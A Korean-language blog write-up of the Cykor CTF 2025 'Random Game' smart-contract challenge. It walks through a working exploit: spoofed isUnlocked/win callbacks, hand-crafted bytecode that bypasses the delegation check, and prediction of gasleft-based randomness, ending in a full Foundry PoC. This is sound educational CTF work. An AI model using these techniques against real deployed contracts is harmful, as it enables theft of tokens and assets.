---
title: (Write-up) Cykor CTF 2025 - Random Game
date: 2025-12-08 09:50:00 +0900
math: true
---

![Random Game](assets/img/posts/2025-12-08-CykorCTF/random_game_thumbnail.png "Random Game")

## 문제 source

```js
/**
 * Setup.sol
 */

// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.30;

import "./Game.sol";

contract Setup {
    Game public game;
    RandomGameNFT public randomGameNFT;
    bool public received;
    address public player;

    constructor() {
        uint256 set = uint256(keccak256(abi.encode(block.timestamp)));

        randomGameNFT = new RandomGameNFT();
        game = new Game(set&0xFFFFFFFF, (set>>32)&0xFFFFFFFF, address(randomGameNFT));
        randomGameNFT.transferOwnership(address(game));
    }

    function start() external {
        require(!received, "Already received");
        received = true;
        game.mint(msg.sender, 10 * 0xFFFFFFFF);
        player = msg.sender;
    }

    function isSolved() external view returns (bool) {
        if (randomGameNFT.balanceOf(player) >= 1) {
            return true;
        }
        return false;
    }
}
```

```js
/**
 * Game.sol
 */
// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {TransientSlot} from "@openzeppelin/contracts/utils/TransientSlot.sol";

contract RandomGameNFT is ERC721, Ownable {
    constructor() ERC721("Random Game NFT", "RGN") Ownable(msg.sender) {}

    function mint(address receiver, uint256 tierId) public onlyOwner {
        _mint(receiver, tierId);
    }
}

/*//////////////////////////////////////////////////////////////
                       Game CONTRACT
//////////////////////////////////////////////////////////////*/

/// keccak256(abi.encode(uint256(keccak256("Game")) - 1)) & ~bytes32(uint256(0xff))
contract Game is ERC20, Ownable layout at 0xa45494c5a0f08ef30723f5277d0c7457ea58d12fa8b674979ab75234d4d70500 {
    using TransientSlot for *;

    enum Tier {
        GOLD,
        PLATINUM,
        DIAMOND
    }

    error GameNotGame();
    error GameIsGame();
    error GameNotAllowedInGame();
    error GameOnlyAllowedInGame();
    error GameNotDelegatedToGame();
    error GameNotEOA();
    error GameNotUnlocked();

    bytes32 internal constant UNLOCKED_TRANSIENT = keccak256("game.storage.Unlocked");
    Game internal immutable GAME_ACCOUNT = this;
    uint256 internal immutable GAME_INIT;
    uint256 internal immutable GAME_BET;
    uint256 internal constant GOLD = 100;
    uint256 internal constant PLATINUM = 2000;
    uint256 internal constant DIAMOND = 40000;
    RandomGameNFT public immutable randomGameNFT;

    mapping(address => uint256) public wins;
    mapping(address => Tier) public tier;

    modifier onlyGame() {
        require(msg.sender == address(GAME_ACCOUNT), GameNotGame());
        _;
    }

    modifier onlyNotGame() {
        require(msg.sender != address(GAME_ACCOUNT), GameIsGame());
        _;
    }

    modifier notOnGame() {
        require(address(this) != address(GAME_ACCOUNT), GameNotAllowedInGame());
        _;
    }

    modifier onlyOnGame() {
        require(address(this) == address(GAME_ACCOUNT), GameOnlyAllowedInGame());
        _;
    }

    modifier onlyDelegatedToGame() {
        bytes memory code = msg.sender.code;

        address payable delegate;
        assembly {
            delegate := mload(add(code, 0x17))
        }
        require(Game(delegate) == GAME_ACCOUNT, GameNotDelegatedToGame());
        _;
    }

    modifier onlyEOA() {
        require(msg.sender == tx.origin, GameNotEOA());
        _;
    }

    modifier unlock() {
        UNLOCKED_TRANSIENT.asBoolean().tstore(true);
        _;
        UNLOCKED_TRANSIENT.asBoolean().tstore(false);
    }

    modifier onlyUnlocked() {
        require(Game(payable(msg.sender)).isUnlocked(), GameNotUnlocked());
        _;
    }

    receive() external payable onlyNotGame {}

    constructor(
        uint256 gameInit,
        uint256 gameBet,
        address _randomGameNFT
    ) ERC20("Random Game", "RG") Ownable(msg.sender) {
        GAME_INIT = gameInit;
        GAME_BET = gameBet;
        randomGameNFT = RandomGameNFT(_randomGameNFT);
        _mint(address(this), 1000_000 ether);
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner(), "Only owner can mint");
        _mint(to, amount);
    }

    function _updateTier(address player) internal onlyOnGame {
        if (wins[player] >= DIAMOND) {
            tier[player] = Tier.DIAMOND;
            randomGameNFT.mint(player, uint256(keccak256(abi.encodePacked(player, "DIAMOND"))));
        } else if (wins[player] >= PLATINUM) {
            tier[player] = Tier.PLATINUM;
            randomGameNFT.mint(player, uint256(keccak256(abi.encodePacked(player, "PLATINUM"))));
        } else if (wins[player] >= GOLD) {
            tier[player] = Tier.GOLD;
            randomGameNFT.mint(player, uint256(keccak256(abi.encodePacked(player, "GOLD"))));
        }
    }

    function game(uint256 guess) external onlyDelegatedToGame onlyUnlocked onlyOnGame {
        if (random() % 100 == guess) {
            GAME_ACCOUNT.transfer(msg.sender, 99 * GAME_BET);
            wins[msg.sender] = Game(payable(msg.sender)).win(msg.sender);
            _updateTier(msg.sender);
        }
    }

    function startGame(uint256 guess) external unlock onlyEOA notOnGame {
        GAME_ACCOUNT.transferFrom(msg.sender, address(GAME_ACCOUNT), GAME_BET);
        GAME_ACCOUNT.game(guess);
    }

    function random() public view returns (uint256) {
        return uint256(keccak256(abi.encode(gasleft(), block.number, GAME_INIT)));
    }

    function win(address player) external onlyGame notOnGame returns (uint256) {
        return ++wins[player];
    }

    function isUnlocked() public view returns (bool) {
        return UNLOCKED_TRANSIENT.asBoolean().tload();
    }
}
```

컨트랙트 전체 구조를 살펴보기보단 바로 문제 풀이로 넘어가는게 좋을 듯 하다. 

목표는 `randomGameNFT.balanceOf(player) >= 1`라는 조건을 만족하도록 해야 한다. 따로 NFT를 mint하는 함수는 Game 컨트랙트 내의 `_updateTier`함수 안에 있고, `_updateTier`함수를 호출하는 함수는 `game()`함수 뿐이니, 이를 참고하여 문제를 풀면 된다. 

game 컨트랙트에서 유저가 호출할 수 있는 함수는 `game()`과 `startGame()` 함수이다. 하지만, `startGame()`함수에 붙어있는 **modifier**를 살펴보면, 이를 호출하는 것이 **불가능하다는** 것을 알 수 있다. 

**간략히 살펴보면,**

- `onlyDelegatedToGame`은 `msg.sender`의 code 데이터를 활용 및 검사한다.
- `onlyEOA`는 `msg.sender`가 EOA가 되어야 한다.

위 두 가지 조건만 살펴봐도 통과할 수 없다는 것을 알 수 있다.

- `notOnGame`은 그냥 통과할 수 없게 만들어졌다.

따라서 game()함수를 직접 호출하여 문제를 푸는 방향으로 진행해야 한다. 조금 더 살펴보면, 세 개의 modifer를 통과한 후, 적절한 guess값을 맞춰야 진행이 되고, _updateTier() 함수 내에서 wins[] 값이 최소 400 이상이어야 NFT를 mint할 수 있다. 정리해보면,

- `modifier: onlyOnGame` ⇒ 해결되어있음
- `modifier: onlyUnlocked`
- `modifier: onlyDelegatedToGame`
- `win[player] ≥ 400`
- `random() % 100 == guess`

이러한 조건을 통과하면 된다.

### modifier: onlyUnlocked
```js
modifier onlyUnlocked() {
    require(Game(payable(msg.sender)).isUnlocked(), GameNotUnlocked());
    _;
}
```
msg.sender에 `isUnlocked`()함수를 호출하여 true를 반환하도록 해야 한다. 이 modifier만 보더라도 **공격용 프록시 컨트랙트를** 작성해야 하는 것을 알 수 있다.

우선 `onlyUnlocked`를 통과할 수 있는 코드를 작성하자.

```js
contract Attack {
    function isUnlocked() public view returns (bool) {
        return true;
    }
    
    ...
}
```

### modifier: onlyDelegatedToGame
이 문제를 풀면서 가장 애먹은 조건이다.
```js
modifier onlyDelegatedToGame() {
    bytes memory code = msg.sender.code;

    address payable delegate;
    assembly {
        delegate := mload(add(code, 0x17))
    }
    require(Game(delegate) == GAME_ACCOUNT, GameNotDelegatedToGame());
    _;
}
```

`msg.sender.code`의 0x17번째 offset부터 0x37번째 offset까지의 데이터를 긁어 그 중 뒤 20bytes를 `GAME_ACCOUNT(game 컨트랙트)`의 주소와 비교하여 그 둘이 같아야 한다는 내용이다. 

컨트랙트의 code영역은 **[code영역 크기(32bytes)] + [code영역]** 이렇게 구성이 되어있는데, 따라서 위 조건을 통과하기 위해서는 [code영역]의 네 번째 offset에 game컨트랙트 주소가 들어가 있도록 해야한다. 

code영역에 컨트랙트 주소를 그냥 넣어놓는다면, 주소 또한 opcode로 인식하고 Invalid한 동작을 수행하게 되니, 아래와 같이 해당 부분이 무시되도록 조치해야 한다.
```text
PUSH1 0x17
JUMP
<GAME_ACCOUNT 주소>
JUMPDEST
<진짜 code영역>
```
```js
bytes memory dummyCode = abi.encodePacked(
    hex"602056",
    address(setup.game()),
    hex"000000000000000000", // error로 인해 padding 추가
    hex"5b"
);
```
이제 `<진짜 code영역>`에는 공격 컨트랙트 데이터들을 삽입해줘야 하는데, 본인은 그런 방법이 아니라 **delegatecall을 활용한 프록시 컨트랙트**를 이용하는 방법을 선택했다. (이유는 뒤에 설명하겠다.)
```js
bytes memory logicCode = abi.encodePacked(
    hex"363d3d373d3d3d363d73",
    address(attack),
    hex"5af43d82803e903d91604c57fd5bf3"
);
// 이 부분은 Gemini에게 부탁해서 error handling 및 최적화등 불필요한 opcode가 많음.
```

이렇게 코드를 작성했으면 코드를 배포하는 init code를 작성해주어야 한다.
```js
bytes memory initCode = abi.encodePacked(
    hex"60", uint8(runtimeCode.length), 
    hex"600c",
    hex"6000",
    hex"39",
    hex"60", uint8(runtimeCode.length), 
    hex"6000",                
    hex"f3"
);
```
이제 세 부분을 모두 합쳐 배포해주면 **onlyDelegatedToGame을 만족**할 수 있다. 

> 💡 위에서 언급했던 프록시 컨트랙트를 사용했던 이유를 이야기해보자면, 원래는 dummyCode 뒤에 Attack 컨트랙트의 runtime code를 그대로 복붙하여 배포하려 했지만, 그렇게 시도하니 이유를 알 수 없는 InvalidJump 에러가 계속 발생해서 결국 포기하고 프록시 컨트랙트로 쉽게 가는 길을 택했다. 
>
> 이후에 출제자인 @hakid29와 대화해보니, dummyCode 뒤에 runtime code를 붙였으니, runtime code 내에서 JUMP처럼 offset이 인자로 들어가는 opcode의 인자에 전부 dummy code의 길이를 더해줘야 한다는걸 놓쳤다는 것을 깨달았다.

### win[player] ≥ 100

`game()` 함수 내에서 아래와 같이 win 값을 호출하므로,
```js
wins[msg.sender] = Game(payable(msg.sender)).win(msg.sender);
```

아래와 같이 공격 컨트랙트에 함수를 추가해주면 된다.
```js
function win(address player) external view returns (uint256) {
    return 100;
}
```

### random() % 100 == guess

이 부분은 두 가지 길이 있는데, 브포로 쉽게 가는 길과 **온체인 데이터를 통해 랜덤값을 직접 연산**하는 방법이 있다. 대회 때는 브포로 해결했는데, 종료 이후 후자의 방법으로 다시 풀어봐서, 후자의 방법을 서술하겠다.

문제에서 random()과 관련된 로직만 모아보자면,
```js
uint256 set = uint256(keccak256(abi.encode(block.timestamp)));
game = new Game(set&0xFFFFFFFF, (set>>32)&0xFFFFFFFF, address(randomGameNFT));
```
```js
function game(uint256 guess) external onlyDelegatedToGame onlyUnlocked onlyOnGame {
    if (random() % 100 == guess) {
    ...
    }
}

function random() public view returns (uint256) {
    return uint256(keccak256(abi.encode(gasleft(), block.number, GAME_INIT)));
}
```
따라서 **random() % 100**을 맞추기 위해서는 아래 과정이 필요하다. 

1. 배포된 시점의 **block.timestamp** 구하기
2. random()함수 내의 **gasleft()** 구하기
3. 구한 값 기반으로 random() 구하기

**1번**은 파이썬으로 쿼리해서 구했다. 

**2번**의 경우, game.game()을 호출할 때 200,000 gas를 지정해서 보낸다 가정하고 foundry에서 제공하는 **debug** 기능을 이용하여 아래와 같이 구했다. (약간의 노가다가 필요하다)
![gasleft](assets/img/posts/2025-12-08-CykorCTF/randomgame_gasleft.png "gasleft")

**3번**은 아래와 같이 구한 뒤, game.game을 호출하면, 문제를 해결할 수 있다. 
```js
uint game_init = uint256(keccak256(abi.encode(1765100917)))&0xFFFFFFFF; 
uint gasLeft = 0x305ec;
uint guess = uint256(keccak256(abi.encode(gasLeft, block.number, game_init))) % 100;
game.game{gas: 200000}(guess);
```
![flag](assets/img/posts/2025-12-08-CykorCTF/randomgame_flag.png "flag")

flag를 보니, 최근 소홀했던 ethernaut에 다시 관심을 가져봐야겠다는 생각이 든다. 

contract의 low level을 공부하기에 좋고, gasleft 추적하는 것도 복습하는 기분이 들어 꽤나 만족스러운 문제였다.

## PoC
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script,  console} from "forge-std/Script.sol";
import "../src/Setup.sol";

contract CounterScript is Script {
    Setup setup;

    function setUp() public {}

    function run() public {
        uint256 pvkey = /** pvkey */;
        address sender = vm.addr(pvkey);
        vm.startBroadcast(pvkey);        
       
        // setup = Setup(/** setup address */); 
        setup = new Setup();

        Attack attack = new Attack();

        bytes memory dummyCode = abi.encodePacked(
            hex"602056",
            address(setup.game()),
            hex"000000000000000000",
            hex"5b"
        );
        bytes memory logicCode = abi.encodePacked(
            hex"363d3d373d3d3d363d73",
            address(attack),
            hex"5af43d82803e903d91604c57fd5bf3"
        );
        bytes memory runtimeCode = abi.encodePacked(dummyCode, logicCode); 

        bytes memory initCode = abi.encodePacked(
            hex"60", uint8(runtimeCode.length), 
            hex"600c",
            hex"6000",
            hex"39",
            hex"60", uint8(runtimeCode.length), 
            hex"6000",                
            hex"f3"
        );

        bytes memory deploycode = abi.encodePacked(
            initCode,
            runtimeCode
        );

        address exploit;
        assembly {
            exploit := create(0, add(deploycode, 0x20), mload(deploycode))
        }
        
        Attack(exploit).attack(setup, setup.game());
        
        console.log(setup.randomGameNFT().balanceOf(exploit));

        vm.stopBroadcast();
    }
}

contract Attack {
    function isUnlocked() public view returns (bool) {
        return true;
    }

    function win(address player) external view returns (uint256) {
        return 40000;
    }

    function attack(Setup setup, Game game) external {
        setup.start();

        uint game_init = uint256(keccak256(abi.encode(1765100917)))&0xFFFFFFFF; 
        uint gasLeft = 0x305ec;
        uint guess = uint256(keccak256(abi.encode(gasLeft, block.number, game_init))) % 100;
        game.game{gas: 200000}(guess);
    }
}
```

재밌는 문제 만들어준 [@hakid29](https://x.com/hakid29?s=21)님에게 감사를~